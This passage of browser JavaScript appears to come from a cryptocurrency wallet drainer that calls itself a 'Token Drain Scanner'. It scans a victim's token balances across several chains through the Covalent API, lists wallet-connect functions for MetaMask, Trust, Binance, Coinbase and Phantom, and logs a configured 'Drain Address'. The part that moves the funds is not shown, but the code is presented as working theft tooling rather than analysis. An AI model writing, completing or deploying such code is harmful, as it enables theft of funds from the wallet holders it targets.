            if (tokens.length > 0) {
                allTokens = [...allTokens, ...tokens];
            }
        } catch (error) {
            console.log(`⚠️ Failed to scan chain ${chainId}:`, error.message);
        }
    }
    
    detectedTokens = allTokens;
    
    if (allTokens.length > 0) {
        displayTokens(allTokens);
        updateStatus(`✅ Found ${allTokens.length} tokens across all chains`);
    } else {
        updateStatus('ℹ️ No tokens found on any chain');
    }
}

// Fetch tokens for specific chain
async function fetchTokensForChain(address, chainId) {
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) {
            throw new Error(`API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        return items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    balance: t.balance,
                    chainId: chainId,
                    chainName: chainName,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url
                };
            });
    } catch (error) {
        console.error(`❌ Token fetch error for chain ${chainId}:`, error);
        return [];
    }
}

// Initialize app on load
window.addEventListener('DOMContentLoaded', initializeApp);

// Make functions available globally
window.closeWalletSelector = closeWalletSelector;
window.connectWithMetaMask = connectWithMetaMask;
window.connectWithTrust = connectWithTrust;
window.connectWithBinance = connectWithBinance;
window.connectWithCoinbase = connectWithCoinbase;
window.connectWithPhantom = connectWithPhantom;
window.connectAnyWallet = connectAnyWallet;
window.connectToAnyWallet = connectToAnyWallet;
window.closeInstructions = closeInstructions;

console.log('=== Token Drain Scanner ===');
console.log('Version: 8.0 - Simplified Working Version');
console.log('Supported Wallets: MetaMask, Trust, Binance, Coinbase, Phantom');
console.log('Device:', isMobile ? '📱 Mobile' : '💻 Desktop');
console.log('Drain Address:', CONFIG.drainAddress);
console.log('===========================');
